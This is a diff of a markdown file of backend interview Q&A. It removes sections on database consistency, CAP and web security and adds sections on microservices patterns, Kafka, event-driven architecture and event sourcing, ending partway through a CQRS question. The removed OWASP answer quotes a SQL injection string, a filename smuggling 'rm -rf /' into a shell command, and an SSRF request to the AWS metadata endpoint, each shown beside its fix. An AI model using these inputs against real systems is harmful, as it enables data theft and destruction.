-3. Data is naturally hierarchical/nested
-   → MongoDB: user profiles with embedded addresses, preferences, history
-
-4. Graph relationships are first-class
-   → Neo4j: "who are friends of my friends who also like jazz?"
-
-5. Simple key lookups with microsecond latency
-   → Redis: session store, real-time leaderboards, rate limiting
-
-6. Geographic distribution with high availability preferred over consistency
-   → DynamoDB, Cassandra: global apps, CAP theorem trade-off (AP systems)
-```
-
-**Decision matrix:**
-
-```
-Use PostgreSQL/MySQL when:
-✅ Complex relationships and JOINs
-✅ ACID transactions are critical (payments, inventory)
-✅ Schema is stable and well-defined
-✅ Ad-hoc analytical queries
-✅ Team knows SQL well
-
-Use MongoDB when:
-✅ Flexible/evolving schema (early-stage startup)
-✅ Document-like data (product catalog, CMS, user profiles)
-✅ Hierarchical data you'd embed rather than JOIN
-✅ Rapid prototyping
-
-Use Redis when:
-✅ Caching, sessions, leaderboards
-✅ Real-time pub/sub
-✅ Temporary data with TTL
-
-Use Cassandra/DynamoDB when:
-✅ Massive write throughput (millions/sec)
-✅ Time-series data
-✅ Multi-region with high availability
-✅ Predictable access patterns (by partition key)
-```
-
-> 📖 Reference: [SQL vs NoSQL — Datastax](https://www.datastax.com/blog/sql-vs-nosql)
-
----
-
-**Q46. What is eventual consistency? How does it differ from strong consistency?**
-
-**Answer:**
-
-| | Strong Consistency | Eventual Consistency |
-|--|-------------------|---------------------|
-| Definition | Every read returns the most recent write | Reads may return stale data, but all nodes converge to same value eventually |
-| Latency | Higher (waits for all replicas to confirm) | Lower (doesn't wait) |
-| Availability | Lower (must wait for consensus) | Higher (can serve from any replica) |
-| Examples | PostgreSQL, CockroachDB, Zookeeper | DNS, DynamoDB (default), Cassandra |
-
-**Real-world illustration:**
-
-```
-Scenario: User changes their profile picture
-
-Strong Consistency:
-t=0:   User writes new avatar to DB
-t=5ms: All 3 replicas updated
-t=5ms: Any user fetching the profile sees NEW avatar ✅
-
-Eventual Consistency:
-t=0:   User writes to primary replica
-t=0ms: User A immediately reads → sees NEW avatar (from primary) ✅
-t=0ms: User B reads from replica 2 → sees OLD avatar (not yet synced) ⚠️
-t=50ms: All replicas synced → now ALL users see NEW avatar ✅
-→ "Eventually" consistent — all nodes will agree, but not immediately
-```
-
-**Code: reading from DynamoDB with consistency choice:**
-
-```js
-const { DynamoDBClient, GetItemCommand } = require('@aws-sdk/client-dynamodb');
-const client = new DynamoDBClient({ region: 'us-east-1' });
-
-// ✅ Eventually consistent read (default, cheaper, faster)
-const result = await client.send(new GetItemCommand({
-  TableName: 'Users',
-  Key: { userId: { S: '42' } },
-  ConsistentRead: false    // eventual consistency: may return slightly stale data
-}));
-
-// ✅ Strongly consistent read (more expensive, slower, always fresh)
-const freshResult = await client.send(new GetItemCommand({
-  TableName: 'Users',
-  Key: { userId: { S: '42' } },
-  ConsistentRead: true     // guaranteed to see latest write
-}));
-```
-
-**When eventual consistency is acceptable:**
-- Social media feeds, likes, view counts (off by a few seconds is fine).
-- Product catalog, search results.
-- DNS propagation.
-- Recommendation systems.
-
-**When you need strong consistency:**
-- Bank balances, inventory counts, seat reservations.
-- Any scenario where reading stale data causes a business problem.
-
-> 📖 Reference: [Eventual Consistency — Werner Vogels](https://www.allthingsdistributed.com/2008/12/eventually_consistent.html)
-
----
-
-**Q47. What is the CAP theorem? Explain CP vs AP systems with examples.**
-
-**Answer:**
-
-The **CAP theorem** states that a distributed system can guarantee at most **2 of 3** properties simultaneously during a network partition:
-
-- **C (Consistency):** Every read returns the most recent write (or an error).
-- **A (Availability):** Every request receives a response (not necessarily the latest data).
-- **P (Partition Tolerance):** System continues operating despite network failures between nodes.
-
-**Network partitions ALWAYS happen in distributed systems** — so you must always choose between **CP** or **AP**.
-
-```
-          C
-         / \
-        /   \
-       /     \
-      CA      CP
-     /         \
-    A --------- P
-          AP
-
-Real-world choice: C or A during partition?
-```
-
-**CP Systems (consistency over availability):**
-
-```
-Example: HBase, MongoDB (with write concern), ZooKeeper, Etcd
-
-During network partition:
-Node 1 ←— partition —→ Node 2
-
-CP system: refuses to serve stale reads
-→ Returns error: "Cannot ensure consistency — please retry later"
-→ No stale data, but temporarily unavailable
-
-Use case: Financial transactions, inventory management, distributed locks
-"I'd rather fail than show wrong data"
-```
-
-**AP Systems (availability over consistency):**
-
-```
-Example: Cassandra, DynamoDB (default), CouchDB, DNS
-
-During network partition:
-Node 1 ←— partition —→ Node 2
-
-AP system: serves data even if potentially stale
-→ Returns best-effort data (might be old)
-→ Always available, but may show stale data
-
-Use case: Social media feeds, shopping carts, product catalog
-"I'd rather show something than nothing"
-```
-
-**Practical example:**
-
-```js
-// Cassandra (AP) — will always respond, but data might be slightly stale
-const cassandra = require('cassandra-driver');
-const client = new cassandra.Client({ contactPoints: ['node1', 'node2', 'node3'] });
-
-// ConsistencyLevel.ONE — fastest, most available, least consistent
-await client.execute(
-  'SELECT * FROM users WHERE id = ?',
-  [userId],
-  { consistency: cassandra.types.consistencies.one } // AP — fast, might be stale
-);
-
-// ConsistencyLevel.QUORUM — majority of nodes must agree (CP-like behavior)
-await client.execute(
-  'SELECT * FROM users WHERE id = ?',
-  [userId],
-  { consistency: cassandra.types.consistencies.quorum } // slower but consistent
-);
-```
-
-> 📖 Reference: [CAP Theorem — IBM](https://www.ibm.com/topics/cap-theorem)
-
----
-
-## 8. Web Security — Intermediate
-
----
-
-**Q48. What is the OWASP Top 10? Name at least 5 items and explain them briefly.**
-
-**Answer:**
-
-The **OWASP Top 10** is the most authoritative list of critical web application security risks. Updated in 2021:
-
-```
-1. Broken Access Control
-2. Cryptographic Failures
-3. Injection
-4. Insecure Design
-5. Security Misconfiguration
-6. Vulnerable and Outdated Components
-7. Identification and Authentication Failures
-8. Software and Data Integrity Failures
-9. Security Logging and Monitoring Failures
-10. Server-Side Request Forgery (SSRF)
-```
-
-**5 explained with examples:**
-
-```js
-// ── 1. Broken Access Control ─────────────────────────────────────────
-// User can access/modify other users' data
-
-// ❌ Vulnerable: user can access ANY order by guessing the ID
-app.get('/orders/:id', requireAuth, async (req, res) => {
-  const order = await Order.findById(req.params.id);
-  res.json(order); // returns order regardless of who owns it
-});
-
-// ✅ Fixed: verify ownership
-app.get('/orders/:id', requireAuth, async (req, res) => {
-  const order = await Order.findOne({
-    where: { id: req.params.id, userId: req.user.userId } // MUST match current user
-  });
-  if (!order) return res.status(404).json({ error: 'Order not found' });
-  res.json(order);
-});
-
-// ── 2. Injection (SQL, NoSQL, Command) ───────────────────────────────
-// ❌ SQL Injection
-const query = `SELECT * FROM users WHERE name = '${req.body.name}'`;
-// Attacker input: ' OR '1'='1 → returns all users!
-
-// ✅ Fixed: parameterized queries
-db.query('SELECT * FROM users WHERE name = ?', [req.body.name]);
-
-// ❌ Command Injection
-exec(`convert ${req.body.filename} output.jpg`); // filename = '; rm -rf /'
-
-// ✅ Fixed: never pass user input to shell commands, use libraries
-const sharp = require('sharp');
-await sharp(sanitizedPath).resize(800, 600).toFile('output.jpg');
-
-// ── 3. Cryptographic Failures ────────────────────────────────────────
-// Sensitive data exposed due to weak/missing encryption
-
-// ❌ Storing passwords in plaintext or MD5
-await db.query('INSERT INTO users (password) VALUES (?)', [password]); // plaintext!
-await db.query('INSERT INTO users (password) VALUES (MD5(?))', [password]); // MD5 broken!
-
-// ✅ Fixed: bcrypt with high work factor
-const hash = await bcrypt.hash(password, 12);
-
-// ❌ Sending PII over HTTP
-// ✅ Enforce HTTPS everywhere, use HSTS header:
-app.use((req, res, next) => {
-  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
-  next();
-});
-
-// ── 5. Security Misconfiguration ────────────────────────────────────
-// ❌ Default credentials, verbose error messages, open debug endpoints
-app.use((err, req, res, next) => {
-  res.status(500).json({ error: err.message, stack: err.stack }); // ❌ exposes internals!
-});
-
-// ✅ Fixed: sanitize error responses in production
-app.use((err, req, res, next) => {
-  if (process.env.NODE_ENV === 'production') {
-    res.status(500).json({ error: 'Internal server error', requestId: req.id });
-  } else {
-    res.status(500).json({ error: err.message, stack: err.stack }); // ok in dev
-  }
-});
-
-// ── 10. SSRF (Server-Side Request Forgery) ────────────────────────────
-// ❌ Server fetches arbitrary URL from user input
-app.get('/proxy', async (req, res) => {
-  const response = await fetch(req.query.url); // attacker: http://169.254.169.254/latest/meta-data/
-  res.send(await response.text());             // → AWS metadata endpoint! credentials leaked
-});
-
-// ✅ Fixed: whitelist allowed domains
-const ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.trusted.com'];
-app.get('/proxy', async (req, res) => {
-  const url = new URL(req.query.url);
-  if (!ALLOWED_DOMAINS.includes(url.hostname)) {
-    return res.status(403).json({ error: 'Domain not allowed' });
-  }
-  const response = await fetch(req.query.url);
-  res.send(await response.text());
-});
-```
-
-> 📖 Reference: [OWASP Top 10 — OWASP](https://owasp.org/www-project-top-ten/)
-
----
-
-**Q49. What is a security header? Name 4 important HTTP security headers and their purpose.**
-
-**Answer:**
-
-Security headers are HTTP response headers that instruct browsers to enable security protections.
-
-```js
-// Set all security headers with helmet.js (recommended)
-const helmet = require('helmet');
-app.use(helmet()); // sets sensible defaults for all headers below
-
-// ── Or configure individually: ────────────────────────────────────────
-
-// 1. Content-Security-Policy (CSP)
-// Prevents XSS by whitelisting allowed content sources
-app.use(helmet.contentSecurityPolicy({
-  directives: {
-    defaultSrc: ["'self'"],              // only load from same origin
-    scriptSrc:  ["'self'", "cdn.jsdelivr.net"], // scripts from self + CDN only
-    styleSrc:   ["'self'", "'unsafe-inline'"],
-    imgSrc:     ["'self'", "data:", "*.cloudinary.com"],
-    connectSrc: ["'self'", "api.myapp.com"],
-    objectSrc:  ["'none'"],              // block <object>, <embed>, <applet>
-    frameAncestors: ["'none'"],          // prevent clickjacking via iframes
-  }
-}));
-// Browser: refuses to load scripts from evil.com even if injected via XSS ✅
-
-// 2. Strict-Transport-Security (HSTS)
-// Forces HTTPS — browser won't make HTTP requests to this domain
-app.use(helmet.hsts({
-  maxAge:            31536000,  // 1 year (in seconds)
-  includeSubDomains: true,      // applies to all subdomains
-  preload:           true       // submit to browser preload lists
-}));
-// Result: browser always uses HTTPS for this domain ✅
-
-// 3. X-Frame-Options
-// Prevents your site from being embedded in iframes (clickjacking defense)
-app.use(helmet.frameguard({ action: 'deny' }));
-// or 'sameorigin' to allow same-domain framing
-// Response header: X-Frame-Options: DENY ✅
-
-// 4. X-Content-Type-Options
-// Prevents MIME type sniffing — browser uses declared Content-Type only
-app.use(helmet.noSniff());
-// Response header: X-Content-Type-Options: nosniff
-// Prevents: serving a .jpg that's actually JavaScript from being executed ✅
-
-// Other important ones:
-// Referrer-Policy: controls how much referrer info is sent
-res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
-
-// Permissions-Policy: restrict browser features
-res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
-```
-
-**Quick reference:**
-
-| Header | Protects against |
-|--------|----------------|
-| `Content-Security-Policy` | XSS, data injection |
-| `Strict-Transport-Security` | Protocol downgrade attacks, cookie hijacking |
-| `X-Frame-Options` | Clickjacking |
-| `X-Content-Type-Options` | MIME sniffing |
-| `Referrer-Policy` | Information leakage via Referer header |
-| `Permissions-Policy` | Malicious use of browser features |
-
-> 📖 Reference: [Security Headers — OWASP](https://owasp.org/www-project-secure-headers/)
-
----
-
-**Q50. What is the principle of least privilege? How does it apply to backend systems?**
-
-**Answer:**
-
-**Least privilege** means every component (user, service, process) should have the **minimum permissions** needed to perform its function — nothing more.
-
-**Applied to database access:**
+**Outbox table schema:**
 
 ```sql
--- ❌ App connects as superuser
--- postgresql.conf: host all postgres password md5
--- → App can DROP TABLE, ALTER SCHEMA, access all databases!
-
--- ✅ Create a dedicated limited user
-CREATE USER myapp_api WITH PASSWORD 'secure-password';
-
--- Grant ONLY what the app needs
-GRANT CONNECT ON DATABASE myapp TO myapp_api;
-GRANT USAGE  ON SCHEMA public TO myapp_api;
-GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO myapp_api;
-
--- Don't grant DROP, ALTER, TRUNCATE, CREATE TABLE
--- If attacker SQL-injects the app, they can't destroy the schema
-
--- Read-only reporting service
-CREATE USER myapp_reporting WITH PASSWORD 'reporting-password';
-GRANT CONNECT ON DATABASE myapp TO myapp_reporting;
-GRANT USAGE   ON SCHEMA public TO myapp_reporting;
-GRANT SELECT ON ALL TABLES IN SCHEMA public TO myapp_reporting;
--- Reporting service can ONLY read — even if compromised, no data modification
+CREATE TABLE outbox (
+  id             BIGSERIAL PRIMARY KEY,
+  aggregate_type VARCHAR(255) NOT NULL,  -- 'Order', 'User', etc.
+  aggregate_id   VARCHAR(255) NOT NULL,  -- the entity's ID
+  event_type     VARCHAR(255) NOT NULL,  -- 'ORDER_CREATED', 'USER_REGISTERED'
+  payload        JSONB        NOT NULL,  -- event data
+  created_at     TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
+  published_at   TIMESTAMPTZ  NULL       -- NULL = not yet published
+);
+CREATE INDEX idx_outbox_unpublished ON outbox(created_at) WHERE published_at IS NULL;
 ```
 
-**Applied to AWS IAM:**
+> 📖 Reference: [Outbox Pattern — Debezium](https://debezium.io/blog/2019/02/19/reliable-microservices-data-exchange-with-the-outbox-pattern/)
+
+---
+
+**Q9. What is a distributed transaction? Why is it hard in microservices?**
+
+**Answer:**
+
+A **distributed transaction** is a transaction that spans multiple services/databases and must maintain ACID properties across all of them — either all steps commit or all roll back.
+
+**Why it's hard:**
+
+```
+Traditional ACID (single DB):
+BEGIN;
+  UPDATE accounts SET balance = balance - 100 WHERE id = 1;
+  UPDATE accounts SET balance = balance + 100 WHERE id = 2;
+COMMIT; -- atomic, guaranteed
+
+Distributed (Order + Payment service with separate DBs):
+Order Service DB:   INSERT INTO orders ...
+Payment Service DB: INSERT INTO payments ...
+               ↑                    ↑
+    Separate DBs, separate processes, separate networks
+    No single transaction coordinator!
+
+Problems:
+1. Partial failure: Order DB write succeeds, Payment DB fails
+   → Order exists, payment doesn't → inconsistent state!
+
+2. Network partitions: Payment service unreachable mid-transaction
+   → Did the payment happen? Did it not?
+
+3. Two-Phase Commit (2PC) solution exists but:
+   - Requires a coordinator that knows about all participants
+   - If coordinator crashes mid-commit → all participants BLOCK waiting
+   - Performance bottleneck: all participants must hold locks until coordinator confirms
+   - Not supported natively by most microservice databases
+
+4. Tight coupling: services need to know about each other's transaction protocol
+```
+
+**What to do instead of distributed transactions:**
+
+```js
+// Option 1: Saga pattern (see Q7) — compensating transactions
+// Accept eventual consistency; undo completed steps on failure
+
+// Option 2: Design to avoid cross-service transactions
+// Restructure your domain: maybe Order + Payment belong in the SAME service
+
+// Option 3: Outbox + idempotency (see Q8)
+// Write locally, publish events, handle duplicates at consumers
+
+// Option 4: "Eventual consistency is acceptable"
+// For most use cases, 50ms of inconsistency doesn't matter
+// Bank account balance can show $0 briefly before payment confirms
+// This is actually what all real payment systems (Stripe, PayPal) do
+
+// The fundamental insight:
+// Distributed systems can't have ACID across network boundaries without massive coordination cost
+// Accept eventual consistency + design compensations for failure cases
+```
+
+> 📖 Reference: [Distributed Transactions — Chris Richardson](https://microservices.io/patterns/data/saga.html)
+
+---
+
+**Q10. What is the Sidecar pattern? Give a practical example.**
+
+**Answer:**
+
+The **Sidecar** deploys a helper container alongside the main application container in the same pod/host. The sidecar augments or extends the main container's functionality without modifying its code.
+
+```
+Pod:
+┌──────────────────────────────────────────┐
+│  Main Container (Node.js API)             │
+│  :3000 → business logic                   │
+│                                           │
+│  Sidecar Container (Envoy proxy)          │
+│  :15001 → handles TLS, metrics, tracing  │
+│                                           │
+│  Shared: network namespace, volumes       │
+└──────────────────────────────────────────┘
+```
+
+**Real-world examples:**
+
+```yaml
+# Example 1: Log shipping sidecar
+# Main app writes logs to a shared volume
+# Sidecar (Fluentd) reads and ships to Elasticsearch
+apiVersion: v1
+kind: Pod
+metadata:
+  name: my-api
+spec:
+  containers:
+  - name: api                          # Main container
+    image: my-api:1.0
+    volumeMounts:
+    - name: log-volume
+      mountPath: /var/log/app
+
+  - name: log-shipper                  # Sidecar
+    image: fluent/fluentd:v1.16
+    volumeMounts:
+    - name: log-volume
+      mountPath: /var/log/app          # reads same logs
+    env:
+    - name: ELASTICSEARCH_HOST
+      value: "elasticsearch:9200"
+
+  volumes:
+  - name: log-volume
+    emptyDir: {}                        # shared between main + sidecar
+
+---
+# Example 2: Service mesh sidecar (Istio/Envoy)
+# Envoy proxy is injected as a sidecar to every pod
+# Handles: mTLS, retries, circuit breaking, distributed tracing
+# The Node.js app has ZERO knowledge of this — it's transparent
+
+# Traffic flow:
+# Incoming: Network → Envoy (sidecar) → Node.js app
+# Outgoing: Node.js app → Envoy (sidecar) → Network
+
+# Node.js app code (unaware of proxy):
+fetch('http://order-service/orders');
+# Envoy intercepts this, adds tracing headers, handles mTLS, retries on 503
+
+---
+# Example 3: Config reloader sidecar
+# Main app reads config from a file
+# Sidecar watches Consul/Vault and updates the config file when it changes
+```
+
+**Benefits of the Sidecar:**
+- Cross-cutting concerns (logging, security, tracing) handled without modifying app code.
+- Works with any language — sidecar is language-agnostic.
+- Update sidecar independently (e.g., update Envoy version without touching your app).
+
+> 📖 Reference: [Sidecar Pattern — Microsoft](https://learn.microsoft.com/en-us/azure/architecture/patterns/sidecar)
+
+---
+
+## 2. Message Brokers & Event-Driven Systems
+
+---
+
+**Q11. What is Apache Kafka? How does it differ from a traditional message queue like RabbitMQ?**
+
+**Answer:**
+
+**Apache Kafka** is a distributed, fault-tolerant event streaming platform. Unlike traditional queues, Kafka persists messages on disk for configurable retention periods and allows multiple consumers to independently replay the event log.
+
+**Core architectural difference:**
+
+```
+RabbitMQ (Traditional Queue):
+Producer → [Queue] → Consumer (message deleted after ACK)
+                  → Consumer 2 gets DIFFERENT message (round-robin)
+"Messages are consumed once and deleted"
+
+Kafka (Event Log):
+Producer → [Topic/Partition: append-only log]
+         offset: 0,1,2,3,4,5,6,7,...
+Consumer Group A reads from offset 5 →
+Consumer Group B ALSO reads from offset 0 → (independent)
+Consumer Group C reads from offset 3 →
+"Events are retained — multiple consumers read independently"
+```
+
+**Key differences:**
+
+| | RabbitMQ | Kafka |
+|--|----------|-------|
+| Model | Push (broker pushes to consumer) | Pull (consumer polls broker) |
+| Message retention | Deleted after ACK | Retained (default 7 days, configurable) |
+| Ordering | Per-queue ordering | Per-partition ordering |
+| Multiple consumers | Competing (one message, one consumer) | Independent (all consumer groups read all messages) |
+| Throughput | ~50K msg/sec | ~1M+ msg/sec |
+| Replay | ❌ No — once consumed, gone | ✅ Yes — rewind offset to re-process |
+| Use case | Task queues, RPC, complex routing | Event streaming, audit log, data pipelines |
+
+```js
+// RabbitMQ: Order processing (competing consumers)
+// One order → one worker processes it
+ch.consume('orders', (msg) => {
+  processOrder(JSON.parse(msg.content));
+  ch.ack(msg); // message gone
+});
+
+// Kafka: Order event (multiple independent consumers)
+// One ORDER_PLACED event → billing reads it → analytics reads it → email reads it
+// All independently, at their own pace, can replay from the start
+const consumer1 = kafka.consumer({ groupId: 'billing-service' });
+const consumer2 = kafka.consumer({ groupId: 'analytics-service' });
+const consumer3 = kafka.consumer({ groupId: 'email-service' });
+
+await consumer1.subscribe({ topic: 'order-events' });
+// Billing processes from offset 0 at billing's speed
+// Analytics processes from offset 0 at analytics' speed — completely independent
+```
+
+> 📖 Reference: [Kafka vs RabbitMQ — Confluent](https://www.confluent.io/blog/kafka-vs-rabbitmq/)
+
+---
+
+**Q12. What are Kafka topics, partitions, and consumer groups? How do they enable scalability?**
+
+**Answer:**
+
+```
+Topic: Logical channel for a category of events
+       e.g., "order-events", "user-events", "payment-events"
+
+Partition: A topic is split into N ordered, immutable logs
+       Partitions enable parallelism:
+       - Producer writes are distributed across partitions
+       - Multiple consumers can read in parallel (1 consumer per partition)
+       - More partitions = higher throughput
+
+Consumer Group: A set of consumers that jointly consume a topic
+       Kafka guarantees each partition is read by exactly ONE consumer in a group
+       → Load balancing within the group
+```
+
+**Visual:**
+
+```
+Topic "order-events" with 3 partitions:
+
+Partition 0: [msg0, msg3, msg6, msg9...]   ← Consumer Instance A
+Partition 1: [msg1, msg4, msg7, msg10...]  ← Consumer Instance B
+Partition 2: [msg2, msg5, msg8, msg11...]  ← Consumer Instance C
+
+Consumer Group "order-processor" has 3 instances → each reads 1 partition
+→ 3x parallelism ✅
+
+If you add a 4th consumer instance → one instance is idle (more consumers than partitions)
+If you have only 1 consumer → it reads all 3 partitions sequentially
+```
+
+**Scalability in practice:**
+
+```js
+const { Kafka } = require('kafkajs');
+const kafka = new Kafka({ brokers: ['kafka1:9092', 'kafka2:9092', 'kafka3:9092'] });
+
+// Producer: use partition key for ordering
+const producer = kafka.producer();
+await producer.connect();
+await producer.send({
+  topic: 'order-events',
+  messages: [{
+    key:   order.userId.toString(), // same user → same partition → ordered events per user
+    value: JSON.stringify({ type: 'ORDER_PLACED', orderId: order.id, userId: order.userId })
+  }]
+});
+
+// Consumer: 3 instances in same group → automatic partition assignment
+const consumer = kafka.consumer({ groupId: 'order-processor' });
+await consumer.connect();
+await consumer.subscribe({ topic: 'order-events', fromBeginning: false });
+
+await consumer.run({
+  eachMessage: async ({ topic, partition, message }) => {
+    const event = JSON.parse(message.value.toString());
+    console.log(`Processing from partition ${partition}:`, event.type);
+    await processOrderEvent(event);
+  }
+});
+
+// Scale: run 3 instances of this consumer process
+// Each automatically gets assigned 1 partition (with 3-partition topic)
+// → 3x throughput without any code changes
+```
+
+> 📖 Reference: [Kafka Core Concepts — Confluent](https://developer.confluent.io/courses/apache-kafka/events/)
+
+---
+
+**Q13. What is the difference between a queue and a pub/sub model?**
+
+**Answer:**
+
+| | Queue (Point-to-Point) | Pub/Sub |
+|--|----------------------|--------|
+| Consumers | One consumer per message | ALL subscribers receive the message |
+| Use case | Task distribution, work queues | Event broadcasting, notifications |
+| Coupling | Consumer knows the queue | Publisher doesn't know who subscribes |
+| Retention | Message deleted after consumption | Message can be retained (Kafka) or ephemeral (Redis Pub/Sub) |
+
+```
+Queue:
+Producer → [Queue] → Consumer A gets msg1
+                   → Consumer B gets msg2
+                   → Consumer A gets msg3  (load balanced)
+
+Pub/Sub:
+Publisher → [Topic] → Subscriber A receives msg ← SAME message
+                    → Subscriber B receives msg ←
+                    → Subscriber C receives msg ←
+```
+
+**Code examples:**
+
+```js
+// ── Queue (RabbitMQ — competing consumers) ────────────────────────────
+// Use case: distribute video encoding jobs
+// Each job processed by exactly one worker
+
+// Producer:
+ch.sendToQueue('video-encoding', Buffer.from(JSON.stringify({ videoId: 42, format: 'mp4' })));
+
+// Workers (3 instances, each gets different jobs):
+ch.consume('video-encoding', (msg) => {
+  const job = JSON.parse(msg.content.toString());
+  encodeVideo(job.videoId, job.format);
+  ch.ack(msg); // message removed from queue
+});
+
+// ── Pub/Sub (Redis) — all subscribers get the message ─────────────────
+// Use case: real-time notifications to ALL connected clients
+
+// Publisher: order service publishes to ALL notification handlers
+await redis.publish('notifications:user:42',
+  JSON.stringify({ type: 'ORDER_SHIPPED', orderId: 99 })
+);
+
+// Subscribers: multiple handlers interested in user 42's events
+const sub1 = redis.duplicate();
+await sub1.subscribe('notifications:user:42');
+sub1.on('message', (ch, msg) => sendWebSocketNotification(JSON.parse(msg)));
+
+const sub2 = redis.duplicate();
+await sub2.subscribe('notifications:user:42');
+sub2.on('message', (ch, msg) => logToAnalytics(JSON.parse(msg)));
+
+// Both sub1 AND sub2 receive the same message
+
+// ── Kafka as durable Pub/Sub ─────────────────────────────────────────
+// ORDER_PLACED → billing-service consumer group reads it
+// ORDER_PLACED → analytics-service consumer group ALSO reads it
+// ORDER_PLACED → email-service consumer group ALSO reads it
+// Each group independently, can replay from beginning
+// This is Kafka's killer feature over traditional pub/sub
+```
+
+> 📖 Reference: [Queue vs Pub/Sub — Google Cloud](https://cloud.google.com/pubsub/docs/overview)
+
+---
+
+**Q14. What is an event-driven architecture? What are its advantages and challenges?**
+
+**Answer:**
+
+**Event-Driven Architecture (EDA)** is a design pattern where components communicate by producing and consuming **events** — records of things that happened — rather than calling each other directly.
+
+```
+Traditional (request-driven):
+Order Service → calls → Inventory Service (direct HTTP)
+Order Service → calls → Notification Service (direct HTTP)
+Order Service → calls → Analytics Service (direct HTTP)
+→ Tight coupling: Order Service must know all 3 services
+
+Event-Driven:
+Order Service → publishes → ORDER_PLACED event
+                     ↓
+              [Event Bus (Kafka)]
+                     ↓           ↓           ↓
+          Inventory Service  Notification  Analytics
+          (subscribes to     (subscribes)  (subscribes)
+          ORDER_PLACED)
+→ Loose coupling: Order Service doesn't know who listens
+```
+
+**Advantages:**
+
+```js
+// 1. Loose coupling — producer doesn't know consumers
+// Add new consumer without changing producer:
+// Week 1: Order Service publishes ORDER_PLACED
+// Week 3: Add Fraud Detection Service — subscribes to ORDER_PLACED
+// → Zero changes to Order Service ✅
+
+// 2. Scalability — consumers scale independently
+// Analytics processes at its own pace, doesn't slow down Orders
+
+// 3. Resilience — consumer downtime doesn't affect producer
+// Notification Service is down for 2 hours
+// → Events queue up in Kafka
+// → When Notification Service recovers, it processes backlog
+// → Order Service never knew there was a problem ✅
+
+// 4. Audit log — events are a natural audit trail
+// Replay all ORDER_PLACED events from January → rebuild analytics from scratch
+// Debug a bug: "what exactly happened to order 42?" → replay events
+```
+
+**Challenges:**
+
+```js
+// 1. Eventual consistency — effects happen asynchronously
+// User places order → "Order confirmed!" shown immediately
+// Inventory update happens 100ms later (after event processed)
+// "Is inventory actually reserved?" → not immediately guaranteed
+
+// 2. Complex error handling — what if consumer fails?
+// Order placed → event published → Inventory Service crashes mid-processing
+// Item appears available but order is created → oversell!
+// Solution: idempotency + dead letter queues + saga compensations
+
+// 3. Event schema evolution — hard to change event structure
+// ORDER_PLACED v1: { orderId, userId, total }
+// ORDER_PLACED v2: { orderId, userId, total, currency } ← added field
+// Consumers processing v1 events will break on v2 structure
+// Solution: schema registry (Confluent Schema Registry + Avro)
+
+// 4. Distributed debugging — "what happened to this request?"
+// A request triggers events → events trigger more events → chain of async events
+// No synchronous call stack to trace
+// Solution: correlation IDs, distributed tracing (Jaeger, Zipkin, OpenTelemetry)
+
+// 5. Ordering guarantees — hard to guarantee global order
+// ORDER_PLACED then ORDER_CANCELLED — must process in that order!
+// Solution: use Kafka partition key to keep related events ordered
+await producer.send({
+  topic: 'order-events',
+  messages: [{ key: orderId.toString(), value: event }] // same orderId → same partition
+});
+```
+
+> 📖 Reference: [Event-Driven Architecture — AWS](https://aws.amazon.com/event-driven-architecture/)
+
+---
+
+**Q15. What is event sourcing? How is it different from storing just the current state?**
+
+**Answer:**
+
+**Traditional state storage:** Store only the current value. History is lost.
+
+```sql
+-- Current state: just the latest values
+UPDATE orders SET status = 'shipped', updated_at = NOW() WHERE id = 42;
+-- All we know: order is currently "shipped". What happened before? Unknown.
+```
+
+**Event Sourcing:** Never update — only append events. Current state is derived by replaying events.
+
+```js
+// ── Event Store (append-only) ────────────────────────────────────────
+// Events table: id, aggregate_id, event_type, payload, timestamp
+
+// Order lifecycle events:
+// 1. ORDER_CREATED   { userId: 1, items: [...], total: 150 }
+// 2. PAYMENT_PROCESSED { amount: 150, transactionId: 'pi_xyz' }
+// 3. ORDER_CONFIRMED {}
+// 4. SHIPMENT_CREATED  { trackingNumber: 'UPS123' }
+// 5. ORDER_DELIVERED   { deliveredAt: '2024-06-01T14:30:00' }
+
+// Rebuild current state by replaying events:
+async function getOrder(orderId) {
+  const events = await db.query(
+    'SELECT * FROM events WHERE aggregate_id = $1 ORDER BY timestamp ASC',
+    [orderId]
+  );
+
+  return events.rows.reduce((state, event) => {
+    switch (event.event_type) {
+      case 'ORDER_CREATED':
+        return { ...state, ...event.payload, status: 'created' };
+      case 'PAYMENT_PROCESSED':
+        return { ...state, paymentId: event.payload.transactionId, status: 'paid' };
+      case 'ORDER_CONFIRMED':
+        return { ...state, status: 'confirmed' };
+      case 'SHIPMENT_CREATED':
+        return { ...state, trackingNumber: event.payload.trackingNumber, status: 'shipped' };
+      case 'ORDER_DELIVERED':
+        return { ...state, deliveredAt: event.payload.deliveredAt, status: 'delivered' };
+      default: return state;
+    }
+  }, {});
+}
+
+// Store new event:
+async function applyEvent(orderId, eventType, payload) {
+  await db.query(
+    'INSERT INTO events (aggregate_id, event_type, payload, timestamp) VALUES ($1, $2, $3, NOW())',
+    [orderId, eventType, JSON.stringify(payload)]
+  );
+  // Optionally update a snapshot for performance (don't replay 1000 events every time)
+}
+```
+
+**Benefits of Event Sourcing:**
+
+```js
+// 1. Complete audit trail — answer "what happened?" with full history
+// Financial regulation: "show me every state change to account 42 in March"
+
+// 2. Time travel — reconstruct state at any point in time
+const orderStateAtMarch1st = replay(events.filter(e => e.timestamp <= '2024-03-01'));
+
+// 3. Bug recovery — replay events with fixed logic to get correct state
+// "Our shipping logic had a bug that miscalculated costs. Replay with fixed code."
+
+// 4. Event-driven integration — events are first-class, can feed Kafka directly
+// Every event written to event store → published to Kafka → other services react
+
+// 5. CQRS natural fit — separate write model (events) from read model (projections)
+```
+
+**Drawbacks:**
+- Querying "current state" requires replaying (use snapshots/projections for performance).
+- Event schema changes are hard (can't alter past events).
+- Conceptually complex for teams used to CRUD.
+
+> 📖 Reference: [Event Sourcing — Martin Fowler](https://martinfowler.com/eaaDev/EventSourcing.html)
+
+---
+
+**Q16. What is CQRS (Command Query Responsibility Segregation)? When is it a good fit?**
+
+**Answer:**
+
+**CQRS** separates **write operations (Commands)** from **read operations (Queries)** into distinct models, often with separate data stores optimized for each purpose.
+
+```
+Traditional CRUD (same model for read + write):
+PUT /orders/42    → same Order object → same DB
+GET /orders?userId=1 → same Order object → same DB
+(one model does everything)
+
+CQRS:
+Write side (Commands):
